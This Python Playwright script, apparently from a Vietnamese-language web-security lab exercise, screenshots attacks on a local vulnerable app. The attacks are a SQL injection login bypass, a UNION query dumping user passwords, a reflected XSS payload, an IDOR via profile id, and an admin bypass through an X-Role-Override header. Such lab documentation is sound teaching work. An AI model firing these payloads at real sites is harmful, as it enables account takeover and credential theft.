import asyncio
from playwright.async_api import async_playwright

async def capture():
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        context = await browser.new_context(viewport={'width': 1200, 'height': 800})
        page = await context.new_page()

        # 1. Trang chu
        await page.goto("http://localhost:3000/")
        await page.screenshot(path="C:/Users/Admin/Downloads/Bai 9/screenshots/01_trang_chu.png")

        # 2. SQLi Login - Truoc khi login
        await page.goto("http://localhost:3000/login")
        await page.fill('input[name="username"]', "admin' --")
        await page.fill('input[name="password"]', "anypassword")
        await page.screenshot(path="C:/Users/Admin/Downloads/Bai 9/screenshots/02_sqli_login_input.png")

        # 3. SQLi Login - Sau khi submit -> Vao profile admin thanh cong
        await page.click('button[type="submit"]')
        await page.wait_for_load_state("networkidle")
        await page.screenshot(path="C:/Users/Admin/Downloads/Bai 9/screenshots/03_sqli_login_success.png")

        # 4. SQLi UNION du lieu san pham
        sqli_union_url = "http://localhost:3000/products?q=%27%20UNION%20SELECT%20id%2C%20username%2C%20password%2C%20role%20FROM%20users%20--"
        await page.goto(sqli_union_url)
        await page.screenshot(path="C:/Users/Admin/Downloads/Bai 9/screenshots/04_sqli_union_leak.png")

        # 5. Reflected XSS
        page.on("dialog", lambda dialog: dialog.accept()) # Tu dong dong dialog neu co
        await page.goto("http://localhost:3000/products?q=%3Cscript%3Ealert(%27Reflected-XSS%27)%3C/script%3E")
        await page.screenshot(path="C:/Users/Admin/Downloads/Bai 9/screenshots/05_reflected_xss.png")

        # 6. Stored XSS - Form Feedback
        await page.goto("http://localhost:3000/feedback")
        await page.screenshot(path="C:/Users/Admin/Downloads/Bai 9/screenshots/06_stored_xss_list.png")

        # 7. IDOR - Doi ID tren URL
        await page.goto("http://localhost:3000/profile?id=2")
        await page.screenshot(path="C:/Users/Admin/Downloads/Bai 9/screenshots/07_idor_profile_id2.png")

        # 8. Broken Access Control - 403 Forbidden tren /admin
        # Tao context moi de khong mang cookie login
        guest_context = await browser.new_context(viewport={'width': 1200, 'height': 800})
        guest_page = await guest_context.new_page()
        await guest_page.goto("http://localhost:3000/admin")
        await guest_page.screenshot(path="C:/Users/Admin/Downloads/Bai 9/screenshots/08_admin_403_forbidden.png")

        # 9. Broken Access Control - Bypass bang Header X-Role-Override: admin
        admin_bypass_page = await guest_context.new_page()
        await admin_bypass_page.set_extra_http_headers({"X-Role-Override": "admin"})
        await admin_bypass_page.goto("http://localhost:3000/admin")
        await admin_bypass_page.screenshot(path="C:/Users/Admin/Downloads/Bai 9/screenshots/09_admin_bypass_header.png")

        await browser.close()
        print("Screenshots captured successfully!")

asyncio.run(capture())
